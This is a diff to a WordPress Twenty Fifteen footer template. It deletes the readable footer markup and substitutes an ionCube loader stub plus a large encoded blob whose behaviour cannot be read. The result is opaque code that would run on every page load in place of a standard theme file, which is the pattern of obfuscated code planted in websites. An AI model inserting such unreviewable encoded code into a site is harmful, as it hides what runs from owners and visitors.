@@ -1,41 +1,41 @@
-<?php
-/**
- * The template for displaying the footer
- *
- * Contains the closing of the "site-content" div and all content after.
- *
- * @package WordPress
- * @subpackage Twenty_Fifteen
- * @since Twenty Fifteen 1.0
- */
+<?php //004fb
+if(!extension_loaded('ionCube Loader')){$__oc=strtolower(substr(php_uname(),0,3));$__ln='ioncube_loader_'.$__oc.'_'.substr(phpversion(),0,3).(($__oc=='win')?'.dll':'.so');if(function_exists('dl')){@dl($__ln);}if(function_exists('_il_exec')){return _il_exec();}$__ln='/ioncube/'.$__ln;$__oid=$__id=realpath(ini_get('extension_dir'));$__here=dirname(__FILE__);if(strlen($__id)>1&&$__id[1]==':'){$__id=str_replace('\\','/',substr($__id,2));$__here=str_replace('\\','/',substr($__here,2));}$__rd=str_repeat('/..',substr_count($__id,'/')).$__here.'/';$__i=strlen($__rd);while($__i--){if($__rd[$__i]=='/'){$__lp=substr($__rd,0,$__i).$__ln;if(file_exists($__oid.$__lp)){$__ln=$__lp;break;}}}if(function_exists('dl')){@dl($__ln);}}else{die('The file '.__FILE__." is corrupted.\n");}if(function_exists('_il_exec')){return _il_exec();}echo("Site error: the ".(php_sapi_name()=='cli'?'ionCube':'<a href="http://www.ioncube.com">ionCube</a>')." PHP Loader needs to be installed. This is a widely used PHP extension for running ionCube protected PHP code, website security and malware blocking.\n\nPlease visit ".(php_sapi_name()=='cli'?'get-loader.ioncube.com':'<a href="http://get-loader.ioncube.com">get-loader.ioncube.com</a>')." for install assistance.\n\n");exit(199);
 ?>
-
-	</div><!-- .site-content -->
-
-	<footer id="colophon" class="site-footer" role="contentinfo">
-		<div class="site-info">
-			<?php
-				/**
-				 * Fires before the Twenty Fifteen footer text for footer customization.
-				 *
-				 * @since Twenty Fifteen 1.0
-				 */
-				do_action( 'twentyfifteen_credits' );
-			?>
-			<?php
-			if ( function_exists( 'the_privacy_policy_link' ) ) {
-				the_privacy_policy_link( '', '<span role="separator" aria-hidden="true"></span>' );
-			}
-			?>
-			<a href="<?php echo esc_url( __( 'https://wordpress.org/', 'twentyfifteen' ) ); ?>" class="imprint">
-				<?php printf( __( 'Proudly powered by %s', 'twentyfifteen' ), 'WordPress' ); ?>
-			</a>
-		</div><!-- .site-info -->
-	</footer><!-- .site-footer -->
-
-</div><!-- .site -->
-
-<?php wp_footer(); ?>
-
-</body>
-</html>
+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
+v/i9TQ+2g0fq
